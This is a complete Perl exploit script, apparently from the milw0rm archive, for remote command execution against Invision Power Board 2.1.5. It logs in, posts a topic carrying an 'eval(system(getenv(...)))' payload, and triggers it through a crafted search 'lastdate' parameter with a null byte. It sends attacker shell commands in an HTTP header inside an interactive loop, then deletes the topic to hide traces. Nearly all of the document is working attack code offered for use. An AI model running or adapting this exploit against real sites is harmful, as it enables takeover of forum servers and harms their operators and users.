<html><head><title>Invision Power Board <= 2.1.5 search.php Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
# Wed Apr 26 16:44:15 CEST 2006 jolascoaga@514.es
#
# INVISION POWER BOARD 2.1.5 &lt;www.invisionboard.com&gt; pr00f 0f c0ncept
#
# remote command execution. vuln credits goes to IceShaman.
#
# works only if you have perms to post a comment. Exploit with replye is
# in my TODO...
#
# 514 still r0xing.
# !dSR the hardc0re hax0rs ;)
# There is no kwel comments in this release, wait for next upgrade
#######################################################################/

use LWP::UserAgent;
use HTTP::Cookies;
use LWP::Simple;
use HTTP::Request::Common &quot;POST&quot;;
use HTTP::Response;
use Getopt::Long;
use strict;

$| = 1; # ;1 = |$

my ($proxy,$proxy_user,$proxy_pass,$lang);
my ($arg_host,$debug,$ipb_user,$ipb_pass, $lang, $errors, $topic_index, $tmp_var);
my ($md5_key, $post_key, $tmp_var);

my %lang_es = (
       'name' =&gt; 'Spanish Language',
       'login' =&gt; &quot;Ahora estás identificado&quot;,
       'incorrect' =&gt; &quot;Nombre de usuario o contraseña incorrectos&quot;,
       'deleted' =&gt; &quot;Tema Eliminado&quot;
);

my %lang_en = (
       'name' =&gt; 'English language',
       'login' =&gt;  &quot;You are now logged in&quot;,
       'incorrect' =&gt; &quot;Sorry, we could not find a member using those log in details&quot;,
       'deleted'  =&gt; 'Topic Deleted',
);
my %lang_strings = ();

my $ua = new LWP::UserAgent(
           cookie_jar=&gt; { file =&gt; &quot;$$.cookie&quot; });

my $options = GetOptions (
 'host=s'            =&gt; \$arg_host,
 'proxy=s'           =&gt; \$proxy,
 'proxy_user=s'      =&gt; \$proxy_user,
 'proxy_pass=s'      =&gt; \$proxy_pass,
 'ipb_user=s'        =&gt; \$ipb_user,
 'ipb_pass=s'        =&gt; \$ipb_pass,
 'lang=s'            =&gt; \$lang,
 'errors'            =&gt; \$errors,
 'debug'             =&gt; \$debug);

my ($host, $forum_index) = $arg_host =~ m/(http.*?)index.*?showforum=(.*)/;
print &quot;Host: $host\nForum Index: $forum_index\n&quot; if $debug;

&amp;help unless ($host);

# w0w0w0w0w0 is smarter than some one i know :D
if (!$lang) {
       lang_autodetect();
       print &quot;Detected lang is: $lang_strings{'name'}\n&quot; if $debug;
}

while (1){
   print &quot;invvy:\\&gt; &quot;;
   my $cmd = &lt;STDIN&gt;;
   &amp;invvy($cmd);
}

sub invvy {
       chomp (my $cmd = shift);
       LWP::Debug::level('+') if $debug;

       $ua-&gt;agent(&quot;Morzilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!&quot;);

       $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
       my $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       ipb_login (); # This works with redirects enabled/disabled


       ipb_post(); # Post in a main forum.

       ipb_exec ($cmd);

       ipb_delete ($forum_index, $topic_index);
}
# guglucitos team presents:

sub help {
   print &quot;Syntax: ./$0 &lt;url&gt; [options]\n&quot;;
   print &quot;\t--ipb_user, --ipb_pass  (needed if dont allow anonymous posts)\n&quot;;
   print &quot;\t--proxy (http), --proxy_user, --proxy_pass\n&quot;;
   print &quot;\t--lang=[es|en] (default: autodetect)\n&quot;;
   print &quot;\t--debug\n&quot;;
   print &quot;\nExample\n&quot;;
   print &quot;bash# $0 --host=http://www.somehost.com/index.php?showforum=2\n&quot;;
   print &quot;\n&quot;;
   exit(1);
}

# sponsorized by coca-cola
sub lang_autodetect {

   my $req = HTTP::Request-&gt;new (GET =&gt; $host.&quot;/index.php&quot;);
   $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
   $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

   print $req-&gt;as_string() if $debug;

   my $res = $ua-&gt;request($req);
   my $html = $res-&gt;content();

   if (($html =~ /Bienvenido,/) or  ($html =~ /Fecha y Hora actual/)) {
               %lang_strings =  %lang_es;
               return;
   }
   if (($html =~ /Welcome,/) or ($html =~ /Time is now/)) {
               %lang_strings = %lang_en;
               return;
   }
   print &quot;Unknown lang switching to default: 'english'\n&quot;;
   %lang_strings =  %lang_en;
}

# login function for 2.1.5
sub ipb_login {
       my $content;
       my $h = $host.&quot;/index.php?act=Login&amp;CODE=01&quot;;
       print $h . &quot;\n&quot; if $debug;
       my $req = POST $h,[
               'referer' =&gt; $host,
               'UserName' =&gt; $ipb_user,
               'PassWord' =&gt; $ipb_pass,
               'CookieDate' =&gt; 1
               ]; #grab these, and send to dsr!
       print $req-&gt;as_string() if $debug;
       my $res = $ua-&gt;request($req);
       if ($errors) {
               print &quot;[+] Context: Login in\n&quot;;
               print &quot;HTTP Error code: &quot;.$res-&gt;code().&quot;\n&quot;;
               print &quot;HTTP Location: &quot;.$res-&gt;header(&quot;Location&quot;).&quot;\n&quot;;
               my ($error) = $res-&gt;content() =~ m/&lt;body&gt;(.*?)&lt;\/body&gt;/s;
               print &quot;- ERROR -\nFind string: &quot;.$lang_strings{'login'}.&quot;\n$error\n- ERROR -\n&quot;;
       }
       if ($res-&gt;code() eq 302) {
               $content = redirect ($res-&gt;header(&quot;Location&quot;));

       } else {

               $content = $res-&gt;content();
       }

       if ($content =~ /$lang_strings{'login'}/ or $content =~ /Logged in as/) {
           print &quot;Logged in\n&quot; if $errors;
       } else {
          die &quot;Can't log in\n&quot;;
       }

}

sub redirect {
   my ($addr) = @_;
   my $req = HTTP::Request-&gt;new (GET =&gt; $addr);
   $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
   $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

   print $req-&gt;as_string() if $debug; # MKSINK is r0xer

   my $res = $ua-&gt;request($req);
   my $html = $res-&gt;content();

   return $html;
}

sub ipb_post {
       # This is for posting into a main index.

       my $h = $host.&quot;/index.php?act=post&amp;do=new_post&amp;f=&quot;.$forum_index;

       my $req = HTTP::Request-&gt;new (GET =&gt; $h);
       $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
       $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       print $req-&gt;as_string() if $debug; #dirty_epic r0x++

       my $res = $ua-&gt;request($req);
       my $html = $res-&gt;content();

       ($md5_key) = $html =~ m/var ipb_md5_check\s+= \&quot;(.*?)\&quot;/;
       ($post_key) = $html =~ m/post_key' value='(.*?)'/;

       print &quot;AUTH check: $md5_key\n&quot; if $debug;
       print &quot;POST key: $post_key\n&quot; if $debug;

       $tmp_var = int(rand(31337));
       my $exploitme = 'eval(system(getenv(HTTP_'.$tmp_var.'))); //'; # seeeeeei la weeeeei
       $h = $host.&quot;/index.php&quot;;

       print $h.&quot;\n&quot; if $debug;

       my $req = POST $h, [
               'st' =&gt; 0,
               'act' =&gt; &quot;Post&quot;,
               's' =&gt; '',
               'f' =&gt; $forum_index,
               'auth_key' =&gt; $md5_key,
               'removeattachid' =&gt; 0,
               'MAX_FILE_SIZE' =&gt; 51200000,
               'CODE' =&gt; '01',
               'post_key' =&gt; $post_key,
               'TopicTitle' =&gt; '514 pwned',
               'TopicDesc' =&gt; '',
               'poll_question' =&gt; '',
               'ffont' =&gt; 0,
               'fsize' =&gt; 0,
               'Post' =&gt; $exploitme,
               'post_htmlstatus' =&gt; 0,
               'enableemo' =&gt; 'yes',
               'enablesig' =&gt; 'yes',
               'mod_options' =&gt; 'nowt',
               'iconid' =&gt; 0,
               'dosubmit' =&gt; 'Post New Topic'
               ];

       $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
       $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       print $req-&gt;as_string() if $debug;
       my $res = $ua-&gt;request($req);
       my $html = $res-&gt;content();

       print &quot;Location: &quot;.$res-&gt;header(&quot;Location&quot;) if $debug;
       ($topic_index) = $res-&gt;header(&quot;Location&quot;) =~ m/showtopic=(\d+)/;
       if ($errors) {
               print &quot;[+] Context: Creating post\n&quot;;
               print &quot;HTTP Error code: &quot;.$res-&gt;code().&quot;\n&quot;;
               print &quot;HTTP Location: &quot;.$res-&gt;header(&quot;Location&quot;).&quot;\n&quot;;
               print &quot;Topic Index: &quot;.$topic_index.&quot;\n&quot;;
               my ($error) = $res-&gt;content() =~ m/&lt;body&gt;(.*?)&lt;\/body&gt;/s;
               print &quot;- ERROR -\nFind string: none\n$error\n- ERROR -\n&quot;;
       }

}

sub ipb_delete {
       my ($fid, $tid) = @_;
       my $req;
       print &quot;Deleting Topic: $tid from forum: $fid\n&quot; if $debug;

       my $h = $host.&quot;/index.php&quot;;
       $req = POST $h, [
                       'st' =&gt; 0,
                       'act' =&gt; 'mod',
                       'f' =&gt; $fid,
                       'auth_key' =&gt; $md5_key,
                       'CODE' =&gt; '08',
                       't' =&gt; $tid,
                       'submit' =&gt; 'Delete this topic'
               ]; # fuck windows automatic reboot
       print $req-&gt;as_string() if $debug;
       $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
       $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       my $res = $ua-&gt;request($req);

       if ($errors) {
               print &quot;[+] Context: Deleting Topic\n&quot;;
               print &quot;HTTP Error code: &quot;.$res-&gt;code().&quot;\n&quot;;
               print &quot;HTTP Location: &quot;.$res-&gt;header(&quot;Location&quot;).&quot;\n&quot;;
               print &quot;Topic Index: &quot;.$topic_index.&quot;\n&quot;;
               my ($error) = $res-&gt;content() =~ m/&lt;body&gt;(.*?)&lt;\/body&gt;/s;
               print &quot;- ERROR -\nFind string: &quot;.$lang_strings{'deleted'}.&quot;\n$error\n- ERROR -\n&quot;;
       }
       # yow yow
       if ($res-&gt;code() eq 200) {
                if ($res-&gt;content() =~ /$lang_strings{'deleted'}/) {
                       print &quot;Topic $topic_index deleted\n&quot; if $errors;
               } else {
                       print &quot;Maybe there was errors deleting post: $topic_index\n&quot; if $errors;
               }
       }
}

# shhhhh this is hidden
sub ipb_exec {
       my ($cmd) = @_;
       my $h = $host.&quot;/index.php?act=Search&amp;CODE=01&quot;;
       my $req = POST $h, [
                       'keywords' =&gt; &quot;HTTP_&quot;.$tmp_var,
                       'namesearch' =&gt; '',
                       'forums[]' =&gt; $forum_index,
                       'prune' =&gt; 0,
                       'prune_type' =&gt; 'newer',
                       'result_type' =&gt; 'posts',
                       'search_in' =&gt; 'posts',
                       'sort_key' =&gt; 'last_post',
                       'searchsubs' =&gt; '1'
               ];
       print $req-&gt;as_string() if $debug;
       $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
       $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       my $res = $ua-&gt;request($req);
       my $html = $res-&gt;content();

       my ($redir) = $html =~ m/url_bit.*?\&quot;(.*?)\&quot;/;
       print &quot;Redirect to: $redir\n&quot; if $errors; # don't ask

       if ($errors) {
               print &quot;[+] Context: First search\n&quot;;
               print &quot;HTTP Error code: &quot;.$res-&gt;code().&quot;\n&quot;;
               print &quot;HTTP Location: &quot;.$res-&gt;header(&quot;Location&quot;).&quot;\n&quot;;
               print &quot;Topic Index: &quot;.$topic_index.&quot;\n&quot;;
               my ($error) = $res-&gt;content() =~ m/&lt;body&gt;(.*?)&lt;\/body&gt;/s;
               print &quot;- ERROR -\nFind string: none\n$error\n- ERROR -\n&quot;;
       }

       if ($res-&gt;code eq 302) {
               $redir = $res-&gt;header(&quot;Location&quot;);
       }

       # piere - tonite is a great song
       my $req = HTTP::Request-&gt;new (GET =&gt; $redir.'&amp;lastdate=z|eval.*?%20//)%23e%00');
       $ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
       $req-&gt;header($tmp_var =&gt; 'echo STARTXPL;'.$cmd.';echo ENDXPL');
       $req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       print $req-&gt;as_string() if $debug;

       my $res = $ua-&gt;request($req);
       my $html = $res-&gt;content();

       $html =~ m/STARTXPL(.*?)ENDXPL/s;
       print $1.&quot;\n&quot;;

       # no matter with you
       if ($errors) {
               print &quot;[+] Context: Executed\n&quot;;
               print &quot;HTTP Error code: &quot;.$res-&gt;code().&quot;\n&quot;;
               print &quot;HTTP Location: &quot;.$res-&gt;header(&quot;Location&quot;).&quot;\n&quot;;
               print &quot;Topic Index: &quot;.$topic_index.&quot;\n&quot;;
               my ($error) = $res-&gt;content() =~ m/&lt;body&gt;(.*?)&lt;\/body&gt;/s;
               print &quot;- ERROR -\nFind string: none\n$error\n- ERROR -\n&quot;;
       }

}
# be aware with la roca peoplee

# milw0rm.com [2006-04-29]</pre></html>